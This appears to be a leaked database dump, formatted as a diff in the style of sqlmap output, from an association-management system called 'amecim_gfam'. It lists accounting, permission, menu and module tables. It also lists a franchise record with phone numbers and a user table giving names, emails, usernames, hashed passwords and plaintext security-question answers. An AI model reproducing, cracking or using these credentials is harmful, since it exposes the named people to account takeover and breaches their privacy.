+| 56  | NULL     | 55                  | S    | PASSIVO CIRCULANTE                                 | 2.1     | 2019-01-08 12:54:40 |
+| 57  | NULL     | 56                  | S    | Empréstimos e Financiamentos                       | 2.1.1   | 2019-01-08 12:54:40 |
+| 58  | NULL     | 56                  | S    | Fornecedores                                       | 2.1.2   | 2019-01-08 12:54:40 |
+| 59  | NULL     | 56                  | S    | Impostos e Contribuições a Recolher                | 2.1.3   | 2019-01-08 12:54:40 |
+| 60  | NULL     | 59                  | S    | PIS                                                | 2.1.3.1 | 2019-01-08 12:54:40 |
+| 61  | NULL     | 59                  | S    | CSLL                                               | 2.1.3.2 | 2019-01-08 12:54:40 |
+| 62  | NULL     | 59                  | S    | COFINS                                             | 2.1.3.3 | 2019-01-08 12:54:40 |
+| 63  | NULL     | 59                  | S    | IRRF                                               | 2.1.3.4 | 2019-01-08 12:54:40 |
+| 64  | NULL     | 59                  | S    | INSS                                               | 2.1.3.5 | 2019-01-08 12:54:40 |
+| 65  | NULL     | 59                  | S    | FGTS                                               | 2.1.3.6 | 2019-01-08 12:54:40 |
+| 66  | NULL     | 59                  | S    | Contribuição Sindical                              | 2.1.3.7 | 2019-01-08 12:54:40 |
+| 67  | NULL     | 56                  | S    | Contas a Pagar                                     | 2.1.4   | 2019-01-08 12:54:40 |
+| 68  | NULL     | 67                  | S    | Salários                                           | 2.1.4.1 | 2019-01-08 12:54:40 |
+| 69  | NULL     | 67                  | S    | Honorários                                         | 2.1.4.2 | 2019-01-08 12:54:40 |
+| 70  | NULL     | 67                  | S    | Fretes e Carretos                                  | 2.1.4.3 | 2019-01-08 12:54:40 |
+| 71  | NULL     | 67                  | S    | Gratificações                                      | 2.1.4.4 | 2019-01-08 12:54:40 |
+| 72  | NULL     | 67                  | S    | Aluguéis                                           | 2.1.4.5 | 2019-01-08 12:54:40 |
+| 73  | NULL     | 67                  | S    | Energia Elétrica                                   | 2.1.4.6 | 2019-01-08 12:54:40 |
+| 74  | NULL     | 67                  | S    | Telefone                                           | 2.1.4.7 | 2019-01-08 12:54:40 |
+| 75  | NULL     | 67                  | S    | Água e Esgoto                                      | 2.1.4.8 | 2019-01-08 12:54:40 |
+| 76  | NULL     | 67                  | S    | Seguros                                            | 2.1.4.9 | 2019-01-08 12:54:40 |
+| 77  | NULL     | 56                  | S    | Provisões                                          | 2.1.5   | 2019-01-08 12:54:40 |
+| 78  | NULL     | 77                  | S    | Provisão p/ Férias                                 | 2.1.5.1 | 2019-01-08 12:54:40 |
+| 79  | NULL     | 77                  | S    | Provisão p/ 13º Salário                            | 2.1.5.2 | 2019-01-08 12:54:40 |
+| 80  | NULL     | 55                  | S    | PASSIVO EXIGÍVEL A LONGO PRAZO                     | 2.2     | 2019-01-08 12:54:40 |
+| 81  | NULL     | 80                  | S    | Obrigações com Terceiros                           | 2.2.1   | 2019-01-08 12:54:40 |
+| 82  | NULL     | 80                  | S    | Tributos parcelados                                | 2.2.2   | 2019-01-08 12:54:40 |
+| 83  | NULL     | 55                  | S    | RESULTADO DE EXERCÍCIOS SEGUINTES                  | 2.3     | 2019-01-08 12:54:40 |
+| 84  | NULL     | 83                  | S    | Receitas patrimoniais                              | 2.3.1   | 2019-01-08 12:54:40 |
+| 85  | NULL     | 83                  | S    | Arrendamentos                                      | 2.3.2   | 2019-01-08 12:54:40 |
+| 86  | NULL     | 83                  | S    | Promoções                                          | 2.3.3   | 2019-01-08 12:54:40 |
+| 87  | NULL     | 55                  | S    | PATRIMÔNIO SOCIAL                                  | 2.4     | 2019-01-08 12:54:40 |
+| 88  | NULL     | 87                  | S    | Fundo patrimonial                                  | 2.4.1   | 2019-01-08 12:54:40 |
+| 89  | NULL     | 87                  | S    | Reservas de reavaliação                            | 2.4.2   | 2019-01-08 12:54:40 |
+| 90  | NULL     | 89                  | S    | Imóveis                                            | 2.4.2.1 | 2019-01-08 12:54:40 |
+| 91  | NULL     | 89                  | S    | Passes de atletas                                  | 2.4.2.2 | 2019-01-08 12:54:40 |
+| 92  | NULL     | 87                  | S    | Subvenções                                         | 2.4.3   | 2019-01-08 12:54:40 |
+| 93  | NULL     | 87                  | S    | Resultados sociais                                 | 2.4.4   | 2019-01-08 12:54:40 |
+| 94  | NULL     | 93                  | S    | Superávits Acumulados                              | 2.4.6.1 | 2019-01-08 12:54:40 |
+| 95  | NULL     | 93                  | S    | Déficits Acumulados                                | 2.4.6.2 | 2019-01-08 12:54:40 |
+| 96  | NULL     | 93                  | S    | Superávit/déficit do exercício                     | 2.4.6.3 | 2019-01-08 12:54:40 |
+| 97  | NULL     | NULL                | S    | RECEITAS                                           | 3.      | 2019-01-08 12:54:40 |
+| 98  | NULL     | 97                  | S    | Mensalidades e contribuições                       | 3.1     | 2019-01-08 12:54:40 |
+| 99  | NULL     | 98                  | S    | Mensalidades de associados                         | 3.1.1   | 2019-01-08 12:54:40 |
+| 100 | NULL     | 98                  | S    | Contribuições sindicais e assistenciais            | 3.1.2   | 2019-01-08 12:54:40 |
+| 101 | NULL     | 97                  | S    | Doações e subvenções                               | 3.2     | 2019-01-08 12:54:40 |
+| 102 | NULL     | 97                  | S    | Promoções                                          | 3.3     | 2019-01-08 12:54:40 |
+| 103 | NULL     | 97                  | S    | Cursos e palestras                                 | 3.4     | 2019-01-08 12:54:40 |
+| 104 | NULL     | 97                  | S    | Outras Receitas                                    | 3.5     | 2019-01-08 12:54:40 |
+| 105 | NULL     | 104                 | S    | Variações Monetárias Ativas                        | 3.5.1   | 2019-01-08 12:54:40 |
+| 106 | NULL     | 104                 | S    | Juros ativos                                       | 3.5.2   | 2019-01-08 12:54:40 |
+| 107 | NULL     | 104                 | S    | Depósitos Judiciais                                | 3.5.3   | 2019-01-08 12:54:40 |
+| 108 | NULL     | 104                 | S    | Recuperação de despesas                            | 3.5.4   | 2019-01-08 12:54:40 |
+| 109 | NULL     | 97                  | S    | Receitas patrimoniais                              | 3.6     | 2019-01-08 12:54:40 |
+| 110 | NULL     | 109                 | S    | Aluguéis e Arrendamentos                           | 3.6.1   | 2019-01-08 12:54:40 |
+| 111 | NULL     | 109                 | S    | Participações em eventos                           | 3.6.2   | 2019-01-08 12:54:40 |
+| 112 | NULL     | 97                  | S    | Receitas extraordinárias                           | 3.7     | 2019-01-08 12:54:40 |
+| 113 | NULL     | 112                 | S    | Vendas de bens patrimoniais                        | 3.7.1   | 2019-01-08 12:54:40 |
+| 114 | NULL     | NULL                | S    | CUSTOS E DESPESAS                                  | 4.      | 2019-01-08 12:54:40 |
+| 115 | NULL     | 114                 | S    | Custos                                             | 4.1     | 2019-01-08 12:54:40 |
+| 116 | NULL     | 115                 | S    | Organização de cursos e palestras                  | 4.1.1   | 2019-01-08 12:54:40 |
+| 117 | NULL     | 115                 | S    | Assistência social                                 | 4.1.2   | 2019-01-08 12:54:40 |
+| 118 | NULL     | 115                 | S    | Anúncios e publicações                             | 4.1.3   | 2019-01-08 12:54:40 |
+| 119 | NULL     | 115                 | S    | Outros custos                                      | 4.1.4   | 2019-01-08 12:54:40 |
+| 120 | NULL     | 114                 | S    | Despesas de Pessoal                                | 4.2     | 2019-01-08 12:54:40 |
+| 121 | NULL     | 120                 | S    | Honorários de Diretores                            | 4.2.1   | 2019-01-08 12:54:40 |
+| 122 | NULL     | 120                 | S    | Ordenados e Salários                               | 4.2.2   | 2019-01-08 12:54:40 |
+| 123 | NULL     | 120                 | S    | Prêmios e Gratificações                            | 4.2.3   | 2019-01-08 12:54:40 |
+| 124 | NULL     | 120                 | S    | Férias                                             | 4.2.4   | 2019-01-08 12:54:40 |
+| 125 | NULL     | 120                 | S    | 13º Salário                                        | 4.2.5   | 2019-01-08 12:54:40 |
+| 127 | NULL     | 120                 | S    | FGTS                                               | 4.2.7   | 2019-01-08 12:54:40 |
+| 128 | NULL     | 120                 | S    | Assistência Médica                                 | 4.2.8   | 2019-01-08 12:54:40 |
+| 129 | NULL     | 120                 | S    | Viagens e Representações                           | 4.2.9   | 2019-01-08 12:54:40 |
+| 130 | NULL     | 120                 | S    | Transporte de Empregados                           | 4.2.10  | 2019-01-08 12:54:40 |
+| 131 | NULL     | 120                 | S    | Programa de Alimentação do Trabalhador             | 4.2.11  | 2019-01-08 12:54:40 |
+| 132 | NULL     | 120                 | S    | (-) Recuperações                                   | 4.2.12  | 2019-01-08 12:54:40 |
+| 133 | NULL     | 114                 | S    | Despesas administrativas                           | 4.3     | 2019-01-08 12:54:40 |
+| 134 | NULL     | 133                 | S    | Combustíveis                                       | 4.3.1   | 2019-01-08 12:54:40 |
+| 135 | NULL     | 133                 | S    | Manutenção de Veículos                             | 4.3.2   | 2019-01-08 12:54:40 |
+| 136 | NULL     | 133                 | S    | Propaganda e Publicidade                           | 4.3.3   | 2019-01-08 12:54:40 |
+| 137 | NULL     | 133                 | S    | Brindes                                            | 4.3.4   | 2019-01-08 12:54:40 |
+| 140 | NULL     | 133                 | S    | Despesas Legais e Judiciais                        | 4.3.7   | 2019-01-08 12:54:40 |
+| 141 | NULL     | 133                 | S    | Serviços de Terceiros                              | 4.3.8   | 2019-01-08 12:54:40 |
+| 142 | NULL     | 133                 | S    | Cursos, eventos e promoções                        | 4.3.9   | 2019-01-08 12:54:40 |
+| 143 | NULL     | 133                 | S    | Auxílios e doações                                 | 4.3.10  | 2019-01-08 12:54:40 |
+| 144 | NULL     | 114                 | S    | Despesas Tributárias                               | 4.4     | 2019-01-08 12:54:40 |
+| 145 | NULL     | 144                 | S    | IPTU                                               | 4.4.1   | 2019-01-08 12:54:40 |
+| 146 | NULL     | 144                 | S    | IPVA                                               | 4.4.2   | 2019-01-08 12:54:40 |
++-----+----------+---------------------+------+----------------------------------------------------+---------+---------------------+
+
+Database: amecim_gfam
+Table: franquia
+[1 entry]
++----+----------+-------------+--------------------+-----------------------------+---------+--------+-----------------+----------------+--------------+---------------+---------------------+
+| id | excluido | id_endereco | cnpj               | logo                        | email   | codigo | celular         | telefone       | razao_social | nome_fantasia | data_cadastro       |
++----+----------+-------------+--------------------+-----------------------------+---------+--------+-----------------+----------------+--------------+---------------+---------------------+
+| 1  | NULL     | 1           | 16.516.565/1651-65 | upload/logo/11547563237.png | <blank> | PR-001 | (41) 99967-6472 | (41) 3666-4900 | Amecim       | Amecim        | 2018-08-09 13:15:16 |
++----+----------+-------------+--------------------+-----------------------------+---------+--------+-----------------+----------------+--------------+---------------+---------------------+
+
+Database: amecim_gfam
+Table: grupo
+[4 entries]
++----+----------+-------------+--------------+--------------+------------------------+---------+---------------------+
+| id | excluido | id_franquia | id_categoria | id_grupo_pai | nome                   | arvore  | data_cadastro       |
++----+----------+-------------+--------------+--------------+------------------------+---------+---------------------+
+| 1  | NULL     | NULL        | NULL         | NULL         | Desenvolvedores        | NULL    | NULL                |
+| 2  | NULL     | NULL        | NULL         | 1            | Franqueadora           | ;1;     | 2018-08-08 14:00:25 |
+| 3  | NULL     | 1           | NULL         | 2            | Amecim                 | ;1;2;   | 2018-08-09 13:15:16 |
+| 4  | NULL     | 1           | NULL         | 3            | Administradores Amecim | ;1;2;3; | 2019-01-08 09:14:43 |
++----+----------+-------------+--------------+--------------+------------------------+---------+---------------------+
+
+Database: amecim_gfam
+Table: grupo_acao
+[73 entries]
++-----+---------+----------+-------------+
+| id  | id_acao | id_grupo | customizada |
++-----+---------+----------+-------------+
+| 1   | 1       | 1        | 0           |
+| 2   | 2       | 1        | 0           |
+| 3   | 3       | 1        | 0           |
+| 4   | 4       | 1        | 0           |
+| 5   | 22      | 1        | 0           |
+| 6   | 23      | 1        | 0           |
+| 7   | 24      | 1        | 0           |
+| 8   | 58      | 1        | 0           |
+| 24  | 258     | 1        | 0           |
+| 25  | 259     | 1        | 0           |
+| 26  | 260     | 1        | 0           |
+| 27  | 261     | 1        | 0           |
+| 28  | 262     | 1        | 0           |
+| 29  | 263     | 1        | 0           |
+| 30  | 264     | 1        | 0           |
+| 31  | 265     | 1        | 0           |
+| 32  | 266     | 1        | 0           |
+| 33  | 267     | 1        | 0           |
+| 34  | 268     | 1        | 0           |
+| 35  | 269     | 1        | 0           |
+| 36  | 270     | 1        | 0           |
+| 37  | 271     | 1        | 0           |
+| 38  | 272     | 1        | 0           |
+| 39  | 273     | 1        | 0           |
+| 102 | 274     | 1        | 0           |
+| 143 | 275     | 1        | 0           |
+| 187 | 276     | 1        | 0           |
+| 188 | 261     | 2        | 0           |
+| 189 | 264     | 2        | 0           |
+| 190 | 275     | 2        | 0           |
+| 191 | 267     | 2        | 0           |
+| 192 | 268     | 2        | 0           |
+| 193 | 262     | 2        | 0           |
+| 194 | 274     | 2        | 0           |
+| 195 | 270     | 2        | 0           |
+| 196 | 23      | 2        | 0           |
+| 197 | 24      | 2        | 0           |
+| 198 | 1       | 2        | 0           |
+| 199 | 273     | 2        | 0           |
+| 200 | 271     | 2        | 0           |
+| 201 | 272     | 2        | 0           |
+| 202 | 22      | 2        | 0           |
+| 203 | 276     | 2        | 0           |
+| 204 | 261     | 3        | 0           |
+| 205 | 264     | 3        | 0           |
+| 206 | 275     | 3        | 0           |
+| 207 | 267     | 3        | 0           |
+| 208 | 268     | 3        | 0           |
+| 209 | 262     | 3        | 0           |
+| 210 | 274     | 3        | 0           |
+| 211 | 270     | 3        | 0           |
+| 212 | 23      | 3        | 0           |
+| 213 | 24      | 3        | 0           |
+| 214 | 1       | 3        | 0           |
+| 215 | 273     | 3        | 0           |
+| 216 | 271     | 3        | 0           |
+| 217 | 272     | 3        | 0           |
+| 218 | 22      | 3        | 0           |
+| 219 | 276     | 3        | 0           |
+| 220 | 264     | 4        | 0           |
+| 221 | 275     | 4        | 0           |
+| 222 | 267     | 4        | 0           |
+| 223 | 268     | 4        | 0           |
+| 224 | 274     | 4        | 0           |
+| 225 | 270     | 4        | 0           |
+| 226 | 23      | 4        | 0           |
+| 227 | 24      | 4        | 0           |
+| 228 | 1       | 4        | 0           |
+| 229 | 273     | 4        | 0           |
+| 230 | 271     | 4        | 0           |
+| 231 | 272     | 4        | 0           |
+| 232 | 22      | 4        | 0           |
+| 233 | 276     | 4        | 0           |
++-----+---------+----------+-------------+
+
+Database: amecim_gfam
+Table: menu
+[10 entries]
++----+--------+---------+----------+-----------------+---------------+-------+-------+-------------------+--------+----------------------------------------------------------------------+
+| id | id_pai | id_acao | excluido | acao            | nome          | ordem | index | icone             | target | descricao                                                            |
++----+--------+---------+----------+-----------------+---------------+-------+-------+-------------------+--------+----------------------------------------------------------------------+
+| 1  | NULL   | 1       | NULL     | home            | Pagina Incial | 1     |       | fa fa-home        | _self  | NULL                                                                 |
+| 2  | NULL   | NULL    | NULL     | <blank>         | Admnistração  | 4     |       | fa fa-gear        | _self  | Menu Pai para itens de administração                                 |
+| 3  | 2      | 4       | NULL     | listar_menu     | Menu          | 1     |       | fa fa-list        | _self  | Registro de Menu do sistema                                          |
+| 4  | 2      | 2       | NULL     | listar_acao     | Ações         | 2     |       | fa fa-square      | _self  | Registro de todas as ações di sistema                                |
+| 5  | 2      | 3       | NULL     | listar_modulo   | Módulos       | 4     |       | fa fa-cube        | _self  | Registros dos diretórios que contem na pasta módulos                 |
+| 6  | 2      | 22      | NULL     | listar_usuario  | Usuários      | 5     |       | fa fa-user        | _self  | Usuários de acesso ao sistema                                        |
+| 7  | 2      | 23      | NULL     | listar_grupo    | Grupos        | 6     |       | fa fa-users       | _self  | Grupos com tipos de permissões do sistema                            |
+| 8  | NULL   | NULL    | NULL     | <blank>         | Relatórios    | 3     |       | fa fa-file-text-o | _self  | Menu Pai  para relatórios do sistema                                 |
+| 9  | NULL   | NULL    | NULL     | <blank>         | Cadastros     | 2     |       | fa fa-tasks       | _self  | Menu pai para itens de cadastros.                                    |
+| 10 | 2      | 258     | NULL     | listar_franquia | Franquias     | 7     |       | fa fa-gears       | _self  | Registros de Franquias que usam o sistema ( Franquias = Associações) |
++----+--------+---------+----------+-----------------+---------------+-------+-------+-------------------+--------+----------------------------------------------------------------------+
+
+Database: amecim_gfam
+Table: modulo
+[23 entries]
++----+----------+----------------------------+-------------------------+--------+
+| id | excluido | dir                        | nome                    | status |
++----+----------+----------------------------+-------------------------+--------+
+| 1  | NULL     | home                       | Home                    | 0      |
+| 2  | NULL     | login                      | Login                   | 0      |
+| 3  | NULL     | usuario                    | Usuários                | 0      |
+| 4  | NULL     | grupo                      | Grupos                  | 0      |
+| 5  | NULL     | acao                       | Ações                   | 0      |
+| 6  | NULL     | modulo                     | Módulos                 | 0      |
+| 7  | NULL     | menu                       | Menus                   | 0      |
+| 8  | NULL     | franquia                   | Franquias               | 0      |
+| 9  | NULL     | estados                    | Estados                 | 0      |
+| 10 | NULL     | cidades                    | Cidades                 | 0      |
+| 11 | NULL     | financeiro_contas          | Contas Pagar Receber    | 0      |
+| 12 | NULL     | clientes                   | Clientes                | 0      |
+| 13 | NULL     | cliente_estado_civil       | Estado Cívil            | 0      |
+| 14 | NULL     | cliente_tipo_pessoa        | Tipo Pessoa             | 0      |
+| 15 | NULL     | financeiro_conta_corrente  | Contas Correntes        | 0      |
+| 16 | NULL     | financeiro_plano_contas    | Plano de Contas         | 0      |
+| 17 | NULL     | financeiro_fornecedor      | Fornecedores            | 0      |
+| 18 | NULL     | financeiro_pagamento_tipo  | Tipo Pagamento          | 0      |
+| 19 | NULL     | banco                      | Bancos                  | 0      |
+| 20 | NULL     | financeiro_fornecedor_tipo | Tipo Fornecedor         | 0      |
+| 21 | NULL     | faturamento                | Faturamento             | 0      |
+| 22 | NULL     | financeiro_configuracao    | Configuração Financeiro | 0      |
+| 23 | NULL     | tesouraria                 | Tesouraria              | 0      |
++----+----------+----------------------------+-------------------------+--------+
+
+Database: amecim_gfam
+Table: teste
+[0 entries]
++----+
+| id |
++----+
++----+
+
+Database: amecim_gfam
+Table: usuario
+[5 entries]
++----+----------+----------+------+-----------------+----------------------------------+-------+-------------------------+-------------------------+----------+--------------+-------------------------------------+-----------------------+------------------+---------------------+--------------------+------------------------+
+| id | id_grupo | excluido | foto | nome            | senha                            | ativo | email                   | usuario                 | cpf_cnpj | fuso_horario | pergunta_senha                      | resposta_senha        | senha_provisoria | data_hora_cadastro  | data_hora_expirado | data_hora_ultimo_login |
++----+----------+----------+------+-----------------+----------------------------------+-------+-------------------------+-------------------------+----------+--------------+-------------------------------------+-----------------------+------------------+---------------------+--------------------+------------------------+
+| 1  | 1        | NULL     | NULL | Squall Robert   | 8a92c112318cbafadb852bcecabf1c21 | 1     | contato@squall.com.br   | admin                   | <blank>  | 23           | qual o nome da sua home page antiga | zellgamesforce        | 0                | 2018-08-08 00:00:00 | NULL               | 2019-03-16 09:38:56    |
+| 2  | 3        | NULL     | NULL | Francisco José  | 8a92c112318cbafadb852bcecabf1c21 | 1     | contato@amecim.com.br   | amecim                  | NULL     | 23           | o memso de sempre                   | sempre o mesmo        | 0                | 2018-08-08 14:03:30 | NULL               | 2019-03-16 09:55:43    |
+| 3  | 4        | NULL     | NULL | Osmair Possebam | 0d74ceac26782332c3e74a01b06b68c4 | 0     | contato@osmair.com.br   | contato@osmair.com.br   | NULL     | 23           | o mesmo de sempre                   | sempre o mesmo amecim | 0                | 2019-01-08 09:13:36 | NULL               | 2019-01-16 14:46:28    |
+| 4  | 3        | NULL     | NULL | Lucas           | 449977705b5208d07a4ad68da3ff6ac5 | 1     | lucasmrueda@hotmail.com | lucasmrueda@hotmail.com | NULL     | 23           | o mesmo de sempre                   | o mesmo de sempre     | 0                | 2019-03-16 09:40:11 | NULL               | 2019-03-16 09:55:10    |
+| 5  | 3        | NULL     | NULL | Osmar           | 449977705b5208d07a4ad68da3ff6ac5 | 1     | osmar@tankspar.com.br   | osmar@tankspar.com.br   | NULL     | 23           | o mesmo de sempre                   | sempre o mesmo        | 0                | 2019-03-16 09:41:21 | NULL               | 2019-03-16 10:30:04    |
++----+----------+----------+------+-----------------+----------------------------------+-------+-------------------------+-------------------------+----------+--------------+-------------------------------------+-----------------------+------------------+---------------------+--------------------+------------------------+
+
